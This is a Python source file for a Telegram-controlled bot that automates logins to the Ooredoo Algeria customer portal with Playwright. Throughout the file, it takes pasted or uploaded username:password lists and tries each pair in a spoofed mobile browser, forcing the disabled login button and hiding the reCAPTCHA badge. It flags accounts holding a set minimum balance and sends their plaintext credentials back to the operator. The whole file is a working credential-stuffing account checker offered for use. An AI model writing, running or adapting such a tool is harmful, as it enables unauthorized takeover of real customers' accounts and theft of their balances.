#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ooredoo Railway Bot
- Playwright browser
- Telegram interface
- Waits for page load, then fills, then submits
- On error → stops and sends screenshot
"""

import os
import re
import sys
import time
import asyncio
import logging
from pathlib import Path

from dotenv import load_dotenv
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.request import HTTPXRequest

load_dotenv()

# ============================================================
#  ⚙️ الإعدادات
# ============================================================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "0"))
MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
RETRY_DELAY = 3
MAX_RETRY = 10

SIGNIN_URL = "https://my.ooredoo.dz/sign-in"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("ooredoo")


# ============================================================
#  📊 الحالة
# ============================================================
state = {"running": False, "stop": False, "stats": None}


class Stats:
    def __init__(self):
        self.total = 0
        self.done = 0
        self.success = 0
        self.hit = 0
        self.no_balance = 0
        self.invalid = 0
        self.retries = 0
        self.errors = 0
        self.start_time = time.time()
        self.hits = []

    def elapsed(self):
        s = int(time.time() - self.start_time)
        h, m, s = s // 3600, (s % 3600) // 60, s % 60
        if h:
            return f"{h}h {m}m {s}s"
        if m:
            return f"{m}m {s}s"
        return f"{s}s"

    def summary(self):
        return (
            f"📊 <b>ملخص الفحص</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"المجموع: <b>{self.total}</b>\n"
            f"تم: <b>{self.done}</b>\n"
            f"✅ نجح: <b>{self.success}</b>\n"
            f"💰 مؤهل: <b>{self.hit}</b>\n"
            f"⚠️ بلا رصيد: <b>{self.no_balance}</b>\n"
            f"❌ invalid: <b>{self.invalid}</b>\n"
            f"🔄 إعادات: <b>{self.retries}</b>\n"
            f"🛑 أخطاء: <b>{self.errors}</b>\n"
            f"⏱️ المدة: <b>{self.elapsed()}</b>"
        )

    def hits_text(self):
        if not self.hits:
            return "ما كاينش حسابات مؤهلة."
        lines = ["💰 <b>الحسابات المؤهلة:</b>", "━━━━━━━━━━━━━━━━━"]
        for i, (u, p, b) in enumerate(self.hits, 1):
            lines.append(f"<b>{i}.</b> <code>{u}:{p}</code> → <b>{b}</b> دج")
        return "\n".join(lines)


# ============================================================
#  🔧 Helpers
# ============================================================
def parse_accounts(text):
    out = []
    for line in text.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"[:\t;,]", line, maxsplit=1)
        if len(parts) < 2:
            continue
        user = parts[0].strip()
        pwd = parts[1].strip()
        if user and pwd:
            out.append((user, pwd))
    return out


def find_balance_in_text(text):
    if not text:
        return None
    pats = [
        r"(?:solde|balance|رصيد|الرصيد)\D{0,30}([\d]+[.,][\d]{1,2})",
        r"([\d]+[.,][\d]{1,2})\s*(?:DA|دج|DZD)",
    ]
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except Exception:
                continue
    return None


def is_invalid_creds(text):
    if not text:
        return False
    t = text.lower()
    return any(p in t for p in [
        "identifiants non valides",
        "identifiants incorrects",
        "invalid user credentials",
        "invalid credentials",
        "mot de passe incorrect",
        "utilisateur non trouvé",
    ])


# ============================================================
#  🖼️ كشف الصفحة الجاهزة (ماشي spinner)
# ============================================================
async def wait_page_ready(page, timeout=30):
    """
    نستنو الصفحة تكون جاهزة:
    - ما كاينش spinner
    - كاين input fields
    """
    start = time.time()
    while time.time() - start < timeout:
        try:
            # نتحققو إذا كاين spinner
            spinner = await page.evaluate("""
                () => {
                    const s = document.querySelector(
                        '.preloader-back, .preloader-floating-circles, ' +
                        '.v-overlay--active .v-progress-circular, ' +
                        '.v-progress-circular--indeterminate'
                    );
                    if (!s) return false;
                    const st = getComputedStyle(s);
                    return st.display !== 'none' && st.visibility !== 'hidden';
                }
            """)
            if spinner:
                await asyncio.sleep(0.5)
                continue

            # نتحققو من وجود الحقول
            has_inputs = await page.evaluate("""
                () => {
                    const pwd = document.querySelector('input[type=password]');
                    const txt = [...document.querySelectorAll('input')].filter(i => {
                        const t = i.type || 'text';
                        return t !== 'password' && t !== 'hidden' && i.offsetParent !== null;
                    });
                    return !!(pwd && txt.length > 0);
                }
            """)
            if has_inputs:
                log.info("Page ready (inputs visible)")
                return True

        except Exception:
            pass
        await asyncio.sleep(0.3)

    log.warning("wait_page_ready timeout")
    return False


# ============================================================
#  🌐 Page helpers
# ============================================================
async def hide_overlays(page):
    try:
        await page.evaluate("""
            () => {
                const sels = ['.swiper', '.swiper-wrapper', '.grecaptcha-badge'];
                for (const s of sels) {
                    document.querySelectorAll(s).forEach(el => {
                        el.style.display = 'none';
                        el.style.pointerEvents = 'none';
                    });
                }
            }
        """)
    except Exception:
        pass


async def fill_username(page, username):
    # 1) JS
    try:
        ok = await page.evaluate("""
            (val) => {
                const labels = [...document.querySelectorAll('label, .v-label, p')];
                let target = null;
                for (const l of labels) {
                    if (/nom d'utilisateur/i.test(l.textContent || '')) {
                        let n = l.parentElement;
                        for (let i = 0; i < 5 && n; i++) {
                            const inp = n.querySelector('input:not([type=password]):not([type=hidden])');
                            if (inp) { target = inp; break; }
                            n = n.parentElement;
                        }
                        if (target) break;
                    }
                }
                if (!target) {
                    const inputs = [...document.querySelectorAll('input')].filter(i => {
                        const t = i.type || 'text';
                        return t !== 'password' && t !== 'hidden' && i.offsetParent !== null;
                    });
                    if (inputs.length) target = inputs[0];
                }
                if (!target) return false;
                target.focus();
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                setter.call(target, val);
                target.dispatchEvent(new Event('input', {bubbles: true}));
                target.dispatchEvent(new Event('change', {bubbles: true}));
                target.dispatchEvent(new Event('blur', {bubbles: true}));
                target.dispatchEvent(new Event('keyup', {bubbles: true}));
                return true;
            }
        """, username)
        if ok:
            check = await page.evaluate("""
                () => {
                    const labels = [...document.querySelectorAll('label, .v-label, p')];
                    for (const l of labels) {
                        if (/nom d'utilisateur/i.test(l.textContent || '')) {
                            let n = l.parentElement;
                            for (let i = 0; i < 5 && n; i++) {
                                const inp = n.querySelector('input:not([type=password]):not([type=hidden])');
                                if (inp) return inp.value;
                                n = n.parentElement;
                            }
                        }
                    }
                    const inp = document.querySelector('input:not([type=password]):not([type=hidden])');
                    return inp ? inp.value : '';
                }
            """)
            if check == username:
                log.info("Username filled via JS")
                return True
    except Exception as e:
        log.warning("JS fill failed: %s", e)

    # 2) press_sequentially
    try:
        loc = None
        try:
            xp = "xpath=//label[contains(., \"Nom d'utilisateur\")]/following::input[1]"
            l = page.locator(xp).first
            if await l.count() > 0:
                loc = l
        except Exception:
            pass

        if not loc:
            for sel in [
                "input[placeholder*='utilisateur' i]",
                "input[name*='user' i]",
                "input[id*='user' i]",
            ]:
                l = page.locator(sel).first
                if await l.count() > 0:
                    loc = l
                    break

        if not loc:
            loc = page.locator("input:not([type=password]):not([type=hidden])").first

        if loc and await loc.count() > 0:
            await loc.scroll_into_view_if_needed()
            try:
                await loc.click(force=True, timeout=5000)
            except Exception:
                pass
            await loc.fill("", force=True)
            await loc.press_sequentially(username, delay=60)
            await loc.press("Tab")
            val = await loc.input_value()
            if val == username:
                log.info("Username filled via press_sequentially")
                return True
    except Exception as e:
        log.warning("press_sequentially failed: %s", e)

    return False


async def fill_password(page, password):
    try:
        ok = await page.evaluate("""
            (val) => {
                const pwd = document.querySelector('input[type=password]');
                if (!pwd) return false;
                pwd.focus();
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                setter.call(pwd, val);
                pwd.dispatchEvent(new Event('input', {bubbles: true}));
                pwd.dispatchEvent(new Event('change', {bubbles: true}));
                pwd.dispatchEvent(new Event('blur', {bubbles: true}));
                pwd.dispatchEvent(new Event('keyup', {bubbles: true}));
                return true;
            }
        """, password)
        if ok:
            check = await page.evaluate(
                "() => document.querySelector('input[type=password]').value"
            )
            if check == password:
                log.info("Password filled via JS")
                return True
    except Exception:
        pass

    try:
        loc = page.locator("input[type=password]").first
        if await loc.count() > 0:
            await loc.fill("", force=True)
            await loc.press_sequentially(password, delay=60)
            await loc.press("Tab")
            val = await loc.input_value()
            if val == password:
                log.info("Password filled via press_sequentially")
                return True
    except Exception as e:
        log.warning("press_sequentially pwd failed: %s", e)

    return False


async def click_connexion(page):
    try:
        return bool(await page.evaluate("""
            () => {
                const btns = [...document.querySelectorAll('button')];
                const t = btns.find(b => /connexion|se connecter/i.test(b.textContent || ''));
                if (!t) return false;
                t.removeAttribute('disabled');
                t.click();
                return true;
            }
        """))
    except Exception:
        return False


async def detect_red_error(page):
    """يكتشف الخطأ الأحمر في الصفحة"""
    try:
        # 1) نبحث في الأخطاء الظاهرة
        err = await page.evaluate("""
            () => {
                // رسائل v-messages
                const vmsgs = [...document.querySelectorAll(
                    '.v-messages__message, .v-input__details .v-messages'
                )];
                for (const m of vmsgs) {
                    const t = (m.textContent || '').trim();
                    if (t.length > 3 && t.length < 200) {
                        const st = getComputedStyle(m);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return t;
                        }
                    }
                }
                // رسائل toast
                const toasts = [...document.querySelectorAll(
                    '.Vue-Toastification__toast, .v-snackbar, .v-alert'
                )];
                for (const t of toasts) {
                    const txt = (t.textContent || '').trim();
                    if (txt.length > 3 && txt.length < 300) {
                        const st = getComputedStyle(t);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return txt;
                        }
                    }
                }
                return null;
            }
        """)
        if err:
            return err.strip()
    except Exception:
        pass

    # 2) نبحث في نص الصفحة
    try:
        body = await page.inner_text("body")
    except Exception:
        body = ""

    pats = [
        r"(identifiants?\s+non\s+valides[^\n]{0,100})",
        r"(identifiants?\s+incorrect[s]?[^\n]{0,100})",
        r"(mot de passe\s+incorrect[^\n]{0,100})",
        r"(invalid user credentials[^\n]{0,100})",
        r"(عذرا[^\n]{0,120}معاودة[^\n]{0,120})",
        r"(يرجى معاودة[^\n]{0,120})",
        r"(veuillez\s+réessayer[^\n]{0,120})",
        r"(erreur[^\n]{0,120})",
        r"(خطأ[^\n]{0,120})",
    ]
    for p in pats:
        m = re.search(p, body, re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return None


async def wait_for_result(page, timeout=45):
    """
    نستنو النتيجة:
    - URL يتغير (دخلنا)
    - خطأ أحمر يظهر
    - timeout
    """
    start = time.time()
    last_url = page.url

    while time.time() - start < timeout:
        # 1) URL تغير؟
        if page.url != last_url:
            log.info("URL changed: %s -> %s", last_url, page.url)
            if "/sign-in" not in page.url and "/login" not in page.url:
                return {"status": "success", "url": page.url}
            last_url = page.url

        # 2) كاين خطأ؟
        err = await detect_red_error(page)
        if err:
            return {"status": "error", "error": err}

        # 3) نتحققو من أننا دخلنا (URL + ما كاينش password input)
        if "/sign-in" not in page.url and "/login" not in page.url:
            try:
                has_pwd = await page.locator("input[type=password]").count()
                if has_pwd == 0:
                    return {"status": "success", "url": page.url}
            except Exception:
                pass

        await asyncio.sleep(0.5)

    return {"status": "timeout"}


async def is_logged_in(page):
    try:
        if "/sign-in" in page.url or "/login" in page.url:
            if await page.locator("input[type='password']").count() > 0:
                return False
        return True
    except Exception:
        return False


# ============================================================
#  🎯 محاولة حساب
# ============================================================
async def try_account(browser, user, pwd, bot, chat_id):
    ctx = await browser.new_context(
        locale="fr-FR",
        viewport={"width": 412, "height": 915},
        user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
    )
    page = await ctx.new_page()

    try:
        # 1) نفتحو الصفحة
        log.info("Opening %s", SIGNIN_URL)
        await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)

        # 2) نستنو الصفحة تكون جاهزة
        ready = await wait_page_ready(page, timeout=30)
        if not ready:
            log.warning("Page not ready after 30s")
            await page.screenshot(path="/tmp/page_not_ready.png", full_page=True)
            try:
                with open("/tmp/page_not_ready.png", "rb") as f:
                    await bot.send_photo(
                        chat_id=chat_id, photo=f,
                        caption=f"⏰ الصفحة ما تحملتش على 30 ثانية\n{user}",
                    )
            except Exception:
                pass
            await ctx.close()
            return {"status": "retry", "msg": "page not ready"}

        await hide_overlays(page)
        await page.wait_for_timeout(300)

        # 3) نعبّيو الحقول
        if not await fill_username(page, user):
            log.error("Fill username FAILED")
            await page.screenshot(path="/tmp/fill_username_fail.png", full_page=True)
            try:
                with open("/tmp/fill_username_fail.png", "rb") as f:
                    await bot.send_photo(
                        chat_id=chat_id, photo=f,
                        caption=f"❌ فشل تعبئة اسم المستخدم: {user}",
                    )
            except Exception:
                pass
            await ctx.close()
            return {"status": "error", "msg": "fill_username failed", "stop": True}

        await page.wait_for_timeout(200)

        if not await fill_password(page, pwd):
            log.error("Fill password FAILED")
            await page.screenshot(path="/tmp/fill_pwd_fail.png", full_page=True)
            try:
                with open("/tmp/fill_pwd_fail.png", "rb") as f:
                    await bot.send_photo(
                        chat_id=chat_id, photo=f,
                        caption=f"❌ فشل تعبئة كلمة السر: {user}",
                    )
            except Exception:
                pass
            await ctx.close()
            return {"status": "error", "msg": "fill_password failed", "stop": True}

        await page.wait_for_timeout(300)

        # 4) نصوّرو قبل الضغط
        await page.screenshot(path="/tmp/before_click.png", full_page=False)

        # 5) نضغطو Connexion
        if not await click_connexion(page):
            log.error("Connexion button not found")
            await page.screenshot(path="/tmp/no_btn.png", full_page=False)
            try:
                with open("/tmp/no_btn.png", "rb") as f:
                    await bot.send_photo(
                        chat_id=chat_id, photo=f,
                        caption=f"❌ زر Connexion ما لقيناش: {user}",
                    )
            except Exception:
                pass
            await ctx.close()
            return {"status": "error", "msg": "no connexion button", "stop": True}

        log.info("Clicked Connexion, waiting for result...")

        # 6) نستنو النتيجة
        result = await wait_for_result(page, timeout=45)
        log.info("Result: %s", result)

        # 7) نصوّرو
        await page.screenshot(path="/tmp/after_submit.png", full_page=False)

        if result["status"] == "success":
            # دخلنا — نجيبو الرصيد
            await page.wait_for_timeout(2000)
            body = await page.inner_text("body")
            bal = find_balance_in_text(body)
            await ctx.close()
            return {"status": "success", "balance": bal}

        if result["status"] == "error":
            err = result["error"]
            log.info("Error detected: %s", err)

            # نبعتو صورة الخطأ للمستخدم
            try:
                with open("/tmp/after_submit.png", "rb") as f:
                    await bot.send_photo(
                        chat_id=chat_id, photo=f,
                        caption=(
                            f"🛑 <b>خطأ!</b>\n"
                            f"الحساب: <code>{user}</code>\n"
                            f"الخطأ: <code>{err}</code>\n\n"
                            f"⏸️ البوت توقف."
                        ),
                        parse_mode="HTML",
                    )
            except Exception:
                pass

            # إذا invalid → نتخطى الحساب
            if is_invalid_creds(err):
                await ctx.close()
                return {"status": "invalid", "msg": err}

            # خطأ آخر → نوقف البوت
            await ctx.close()
            return {"status": "error", "msg": err, "stop": True}

        # timeout
        log.warning("Timeout waiting for result")
        try:
            with open("/tmp/after_submit.png", "rb") as f:
                await bot.send_photo(
                    chat_id=chat_id, photo=f,
                    caption=f"⏰ timeout بعد الضغط: {user}",
                )
        except Exception:
            pass
        await ctx.close()
        return {"status": "error", "msg": "timeout after submit", "stop": True}

    except Exception as e:
        log.exception("try_account error")
        try:
            await ctx.close()
        except Exception:
            pass
        return {"status": "error", "msg": str(e), "stop": True}


# ============================================================
#  🚀 الفحص
# ============================================================
async def run_check(app, chat_id, accounts):
    stats = Stats()
    stats.total = len(accounts)
    state["stats"] = stats
    bot = app.bot

    await bot.send_message(
        chat_id=chat_id,
        text=(
            f"🚀 <b>بداية الفحص</b>\n"
            f"عدد: <b>{len(accounts)}</b>\n"
            f"الحد: <b>{MIN_BALANCE}</b> دج\n"
            f"/stop للإيقاف."
        ),
        parse_mode="HTML",
    )

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=HEADLESS,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            last_update = time.time()
            for idx, (user, pwd) in enumerate(accounts, 1):
                if state["stop"]:
                    await bot.send_message(chat_id=chat_id, text="⏹️ تم الإيقاف.")
                    break

                attempts = 0
                while attempts < MAX_RETRY:
                    attempts += 1
                    if state["stop"]:
                        break

                    try:
                        r = await try_account(browser, user, pwd, bot, chat_id)
                    except Exception:
                        log.exception("account failed")
                        r = {"status": "error", "msg": "exception", "stop": True}

                    if r.get("stop"):
                        # 🛑 نوقف البوت
                        stats.errors += 1
                        stats.done += 1
                        await bot.send_message(
                            chat_id=chat_id,
                            text=f"🛑 <b>البوت توقف</b>\nالسبب: <code>{r.get('msg')}</code>",
                            parse_mode="HTML",
                        )
                        state["stop"] = True
                        break

                    if r["status"] == "success":
                        stats.success += 1
                        bal = r.get("balance")
                        if bal is None:
                            stats.no_balance += 1
                        elif bal >= MIN_BALANCE:
                            stats.hit += 1
                            stats.hits.append((user, pwd, bal))
                            await bot.send_message(
                                chat_id=chat_id,
                                text=(
                                    f"💰 <b>حساب مؤهل!</b>\n"
                                    f"👤 <code>{user}</code>\n"
                                    f"🔑 <code>{pwd}</code>\n"
                                    f"💵 <b>{bal}</b> دج"
                                ),
                                parse_mode="HTML",
                            )
                        break

                    if r["status"] == "invalid":
                        stats.invalid += 1
                        break

                    stats.retries += 1
                    await asyncio.sleep(RETRY_DELAY)

                stats.done += 1

                if state["stop"]:
                    break

                if time.time() - last_update > 15:
                    try:
                        await bot.send_message(
                            chat_id=chat_id,
                            text=(
                                f"⏳ <b>تقدم</b> {idx}/{len(accounts)}\n"
                                f"✅ {stats.success} | 💰 {stats.hit} | "
                                f"❌ {stats.invalid} | 🛑 {stats.errors}"
                            ),
                            parse_mode="HTML",
                        )
                    except Exception:
                        pass
                    last_update = time.time()

        finally:
            await browser.close()

    try:
        await bot.send_message(chat_id=chat_id, text=stats.summary(), parse_mode="HTML")
        if stats.hits:
            await bot.send_message(chat_id=chat_id, text=stats.hits_text(), parse_mode="HTML")
    except Exception:
        pass

    state["running"] = False
    state["stop"] = False


# ============================================================
#  🤖 Handlers
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 <b>بوت Ooredoo Railway</b>\n\n"
        "ابعتلي ملف <code>accounts.txt</code>:\n"
        "<code>0553372434:password</code>\n\n"
        "/start /status /stop",
        parse_mode="HTML",
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if state["running"]:
        s = state["stats"]
        await update.message.reply_text(
            f"⏳ <b>جاري...</b>\n"
            f"تم: {s.done}/{s.total}\n"
            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🛑 {s.errors}",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text("✅ جاهز. ابعتلي ملف.")


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state["stop"] = True
    await update.message.reply_text("⏹️ جاري الإيقاف...")


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return
    if state["running"]:
        await update.message.reply_text("⚠️ فحص جاري. /stop أولاً.")
        return

    doc = update.message.document
    if not doc:
        return

    file = await ctx.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    accounts = parse_accounts(text)

    if not accounts:
        await update.message.reply_text("❌ الملف فارغ أو الصيغة غالطة.")
        return

    state["running"] = True
    state["stop"] = False

    await update.message.reply_text(
        f"📄 توصلت بـ <b>{len(accounts)}</b> حساب\nنبداو...",
        parse_mode="HTML",
    )
    asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return

    text = update.message.text.strip()
    if text.startswith("/"):
        return

    accounts = parse_accounts(text)
    if accounts:
        if state["running"]:
            await update.message.reply_text("⚠️ فحص جاري.")
            return
        state["running"] = True
        state["stop"] = False
        await update.message.reply_text(
            f"📄 <b>{len(accounts)}</b> حساب. نبداو...",
            parse_mode="HTML",
        )
        asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
    else:
        await update.message.reply_text("💡 ابعتلي ملف أو الصق الحسابات.")


# ============================================================
#  Main
# ============================================================
def main():
    print("🚀 Ooredoo Railway Bot starting...")
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise Exception("TELEGRAM_TOKEN أو TELEGRAM_CHAT_ID ناقصين")

    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0,
    )

    app = (
        Application.builder()
        .token(TELEGRAM_TOKEN)
        .request(request)
        .get_updates_request(request)
        .build()
    )

    async def on_error(update, context):
        log.error("Handler error: %s", context.error)

    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("✅ Bot running")
    app.run_polling(allowed_updates=Update.ALL_TYPES, poll_interval=2.0, timeout=30)


if __name__ == "__main__":
    main()
